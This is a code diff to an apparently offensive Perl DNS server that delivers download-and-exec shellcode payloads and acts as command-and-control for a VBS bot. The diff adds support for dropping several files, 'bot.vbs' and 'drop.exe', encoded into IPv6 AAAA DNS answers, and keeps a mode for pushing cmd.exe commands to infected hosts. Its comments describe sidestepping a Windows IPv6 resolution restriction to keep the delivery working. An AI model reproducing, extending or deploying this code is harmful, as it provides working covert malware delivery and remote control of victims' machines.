@@ -5,28 +5,28 @@
 #   dookie _at_ inbox.ru
 #   alex.sintsov _at_ gmail.com
 #
-#   Long memory for DSecRG team
-#
-# Special for CONFidence 2011, Krakow
+# Original: Special for CONFidence 2011, Krakow
+#           Long memory for DSecRG team
 #
 # This DNS server used for reverse DNS Shellcode (download and exec)  and for C&C bot (VBS script that downloaded by shellcode)
 #
 #  P.S. Sorry - dirty coding and NOT user friendly iface 8)
 #
-#  UPD 2016: now reserved IPv6 used to bypass winapi restriction on resolving IPv6 without address assigned to the interface
-#            Also maximum size of drop file has been extended up to 88Mb
+#  Fixes and features added in 2016: 
+#            1) now reserved IPv6 used to bypass winapi restriction on resolving IPv6 without  having address assigned to the interface
+#            2) Also maximum size of one drop file has been extended up to 88Mb
+#            3) New feature added: can be stored more than 1 file!
 #
 
- use Net::DNS::Nameserver; # Please can get from cpan
+ use Net::DNS::Nameserver; # Please get from cpan
  use MIME::Base64;
- use Switch;               # Please can get from cpan 
 
- 
- $EGG="drop.exe";                   # File to DROP (VBS DNS BOT)
- $defaultcmd="ipconfig";            # default bot command
- $DOMAIN="dom.ws";                  # domain !!! need to be changed
- $IPA="11.11.11.11";                # ip address of our server !!! need to be changed
- $timeout=60*10;                    # timeout
+ ###### CONFIG ##################################
+ @EGGs = ("bot.vbs","drop.exe");      # Files to DROP (VBS DNS BOT): here bot.vbs will be "stored" into a.zlo.ws and drop.exe into b.zlo.ws
+ $defaultcmd = "exit";                # default bot command
+ $DOMAIN = "zlo.ws";                 # domain !!! need to be changed
+ $IPA = "11.11.11.11";              # ip address of our server !!! need to be changed
+ $timeout = 60 * 10;                  # timeout
  ###############################################
  ###############################################
  
@@ -48,11 +48,6 @@
      my ($qname, $qclass, $qtype, $peerhost,$query,$conn) = @_;
      my ($rcode, @ans, @auth, @add);
 
-
-    
-     #$query->print;
-
-
      if ($qtype eq "A" && $qname eq "$DOMAIN" ) {
          my ($ttl, $rdata) = (360, "$IPA");
          push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
@@ -73,124 +68,29 @@
               my ($ttl, $rdata) = (1,, "qwertyuiopasdfghjklzxcvbnm1234567890aaaaaaaaabbbbbbbbbcccccccc1");
               push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
               print "CNAME request\n";
-    }elsif (($qtype eq "AAAA" && substr($qname,0,1) ne "X") && $qname =~ /(.*)\.$DOMAIN/){
+    }elsif (($qtype eq "AAAA" && substr($qname,0,1) ne "X") && $qname =~ /(.*)\.$DOMAIN/){ ## Download request
     
               $rcode = "NOERROR";
               if($array1{$1})
-              {              
-                if ($array1{$1}[0])
-                {
-                    ($ttl, $rdata) = (1,, $array1{$1}[0]);
-                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
-                }
-              
-                  if ($array1{$1}[1])
-                  {
-                    ($ttl, $rdata) = (1,, $array1{$1}[1]);
-                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
-                  }
-                  
-                  if ($array1{$1}[2])
-                  {
-                    ($ttl, $rdata) = (1,, $array1{$1}[2]);
-                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
-                  }
-                  
-                  if ($array1{$1}[3])
-                  {
-                    ($ttl, $rdata) = (1,, $array1{$1}[3]);
-                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
-                  }
-                  
-                  if ($array1{$1}[4])
-                  {
-                    ($ttl, $rdata) = (1,, $array1{$1}[4]);
-                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
-                  }
-                  
-                  if ($array1{$1}[5])
-                  {
-                    ($ttl, $rdata) = (1,, $array1{$1}[5]);
-                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
-                  }
-                  
-                  if ($array1{$1}[6])
-                  {
-                    ($ttl, $rdata) = (1,, $array1{$1}[6]);
-                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
-                  }
-                  
-                  if ($array1{$1}[7])
-                  {
-                    ($ttl, $rdata) = (1,, $array1{$1}[7]);
-                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata"); 
-                  }
-                  
-                 if ($array1{$1}[8])
-                  {
-                    ($ttl, $rdata) = (1,, $array1{$1}[8]);
-                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
-                  }
-                  
-                  if ($array1{$1}[9])
-                  {
-                    ($ttl, $rdata) = (1,, $array1{$1}[9]);
-                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
-                  }
-                  
-                  if ($array1{$1}[10])
-                  {
-                    ($ttl, $rdata) = (1,, $array1{$1}[10]);
-                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
-                  }
-                  
-                  if ($array1{$1}[11])
-                  {
-                    ($ttl, $rdata) = (1,, $array1{$1}[11]);
-                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
-                  }
-                  
-                  if ($array1{$1}[12])
-                  {
-                    ($ttl, $rdata) = (1,, $array1{$1}[12]);
-                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
-                  }
-                  
-                  if ($array1{$1}[13])
-                  {
-                    ($ttl, $rdata) = (1,, $array1{$1}[13]);
-                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
-                   }
-                  
-                  if ($array1{$1}[14])
-                  {    
-                    ($ttl, $rdata) = (1,, $array1{$1}[14]);
-                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
-                  }
-                  
-                  if ($array1{$1}[15])
-                  {
-                    ($ttl, $rdata) = (1,, $array1{$1}[15]);
-                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
-                  }
-                  
-                  if ($array1{$1}[16])
-                  {    
-                    ($ttl, $rdata) = (1,, $array1{$1}[16]);
-                    push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
-                  }
-                  
+              {    
+                
+                    for($ipx = 0; $ipx < 17; $ipx++)
+                    {
+                        if ($array1{$1}[$ipx])
+                        {
+                            ($ttl, $rdata) = (1,, $array1{$1}[$ipx]);
+                            push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
+                        }
+                    }
                                      
-                }else{
+               }else{
                     ($ttl, $rdata) = (1,, "fff0:0000:0000:0000:0000:0000:0000:0000");
                     push @ans, Net::DNS::RR->new("$qname $ttl $qclass $qtype $rdata");
-                }
-                
-                
+               }
                         
               print "Received query for download ($qname) from $peerhost to ". $conn->{"sockhost"}. "\n";
               
-    }elsif (($qtype eq "A")&& $qname =~ /(.*)\.$DOMAIN/){
+    }elsif (($qtype eq "A")&& $qname =~ /(.*)\.$DOMAIN/){  ## BOT.VBS C&C
                 $rcode = "NOERROR";
               
                
@@ -488,7 +388,7 @@
      }
      
 
-     # mark the answer as authoritive (by setting the 'aa' flag
+     # mark the answer as authoritative (by setting the 'aa' flag
      return ($rcode, \@ans, \@auth, \@add, { aa => 1 });
  }
  
@@ -500,108 +400,113 @@
      Verbose      => 1,
  ) || die "couldn't create nameserver object\n";
 
- 
- open (FILE, "<$EGG") or die 'cant open';
- 
- $pk="aaaa";
- $pkc=$pk;
- $i=0;
- $byte=0;
- 
- $size=0;
- $z=0;
- 
- $tmpbyte="";     # current addr
- $addr_size = 0;  # addr size
- $block_size = 0; # block size flag
- @array = {};
- $two_bytes = ''; # temp buf
- $count = 0;
- 
-while (1) {
-    $readed = read(FILE, $filBuff, 1);
+$subd = "a"; 
+@array = {}; # DATA base of files
+
+foreach my $FILEx (@EGGs) {
     
-    if (not $readed) #  Last byte happened already
-    {
-        print "last\n";
-        if  ($count > 0){
-            $pkc++;
-        }
-        $pk = join '', reverse split /(.)/, $pkc;
-        $lenx = $addr_size * 2;
-        if ($block_size == 1) # fill rest of block
-        {
-            print "1\n";
-            $two_bytes.= "\0";
-            $block_size = 0;
-            $tmpbyte .= ":".unpack("H4",$two_bytes);
-            $lenx--;
-        }
+     open (FILE, "<$FILEx") or die 'cant open';
+     
+     $pk="aaaa";
+     $pkc=$pk;
+     $i=0;
+     $byte=0;
+     
+     $size=0;
+     $z=0;
+     
+     $tmpbyte="";     # current addr
+     $addr_size = 0;  # addr size
+     $block_size = 0; # block size flag
+
+     $two_bytes = ''; # temp buf
+     $count = 0;
+     
+    while (1) {
+        $readed = read(FILE, $filBuff, 1);
         
-        if  ($addr_size < 7) # fill rest of addr
+        if (not $readed) #  Last byte happened already
         {
-            print "2\n";
-            for (;$addr_size<7;$addr_size++)
-            {
-                $tmpbyte .= ":0000"
+            print "last\n";
+            if  ($count > 0){
+                $pkc++;
             }
-        }
-        
-        $address = "fff". ''. sprintf("%01X", $lenx) . $tmpbyte;
-        $addr_size = 0;
-        $array1{$pk}[$count]=$address;  # Addr added
-        print "LAST $pk - $count  $address\n";
-        $tmpbyte='';
-        $count++;
-        
-        last;
-        
-    } else { # Read the byte
-    
-        $in_byte = $filBuff;
-        $size++;
-        
-        
-        if ($block_size==0) # new block
-        {
-            $two_bytes = $in_byte;
-            $block_size = 1;
-            $addr_size++;
-        } elsif ($block_size==1) {
-            $two_bytes.= $in_byte;
-            $block_size = 0;
-            $tmpbyte .= ":".unpack("H4",$two_bytes);
-        } 
-        
-        if ($addr_size == 7 and $block_size == 0) # new addr
-        {
-            $address = "ff". ''.sprintf("%02X",($count*0x0e)) . $tmpbyte;
+            $pk = join '', reverse split /(.)/, $pkc;
+            $lenx = $addr_size * 2;
+            if ($block_size == 1) # fill rest of block
+            {
+                print "1\n";
+                $two_bytes.= "\0";
+                $block_size = 0;
+                $tmpbyte .= ":".unpack("H4",$two_bytes);
+                $lenx--;
+            }
+            
+            if  ($addr_size < 7) # fill rest of addr
+            {
+                print "2\n";
+                for (;$addr_size<7;$addr_size++)
+                {
+                    $tmpbyte .= ":0000"
+                }
+            }
+            
+            $address = "fff". ''. sprintf("%01X", $lenx) . $tmpbyte;
             $addr_size = 0;
-            $array1{$pk}[$count]=$address;  # Addr added
-            print "$pk - $count  $address\n";
+            $array1{$pk.".".$subd}[$count]=$address;  # Addr added
+            print "LAST $pk.$subd - $count  $address\n";
             $tmpbyte='';
             $count++;
-        } 
+            
+            last;
+            
+        } else { # Read the byte
         
-        if ($count == 17){
-     
-          $pkc++;
-          $pk = join '', reverse split /(.)/, $pkc;
-          $count = 0;
-          if (length($pk)==5)
-          {
-            die("TOO BIG FILE, SORRY!");
-          }
+            $in_byte = $filBuff;
+            $size++;
+            
+            
+            if ($block_size==0) # new block
+            {
+                $two_bytes = $in_byte;
+                $block_size = 1;
+                $addr_size++;
+            } elsif ($block_size==1) {
+                $two_bytes.= $in_byte;
+                $block_size = 0;
+                $tmpbyte .= ":".unpack("H4",$two_bytes);
+            } 
+            
+            if ($addr_size == 7 and $block_size == 0) # new addr
+            {
+                $address = "ff". ''.sprintf("%02X",($count*0x0e)) . $tmpbyte;
+                $addr_size = 0;
+                $array1{$pk.".".$subd}[$count]=$address;  # Addr added
+                print "$pk.$subd - $count  $address\n";
+                $tmpbyte='';
+                $count++;
+            } 
+            
+            if ($count == 17){
+         
+              $pkc++;
+              $pk = join '', reverse split /(.)/, $pkc;
+              $count = 0;
+              if (length($pk)==5)
+              {
+                die("TOO BIG FILE, SORRY!");
+              }
+            }
+        
         }
-    
-    }
-   
- }
- 
- close (FILE);
- print "\n\nFile loaded... \nFILE SIZE = $size bytes\n\n";
-
- 
+       
+     }
+     
+     close (FILE);
+     print "\n\nFile loaded... \nFILE SIZE = $size bytes\n\n";
+     $subd++;
+}
+########### 
  
  do{
     print "\n[MODE]\n1 - Auto command\n2 - Interctive command\nCTRL+C- change mode live\n\n#:>";
@@ -609,15 +514,16 @@ while (1) {
     chomp($autocmd);
   }while($autocmd!=1 && $autocmd!=2);
  
- switch($autocmd){
-    case 1    {
+ if ($autocmd == 1){
             print "\n[DEFAULT COMMAND]\nfor cmd.exe, ipconfig for example...\n\n#:>";
             $defaultcmd = <STDIN>;
             chomp($defaultcmd);
             print "\nAuto mode enabled.\n";
             }
-    case 2    {print "\nInteractive mode enabled.\n";}
-  }
+ elsif($autocmd ==2){
+            print "\nInteractive mode enabled.\n";
+            }
+ 
   
  $SIG{'INT'}='INT_handler';
  $SIG{'ALRM'} = 'ALRM_handler';
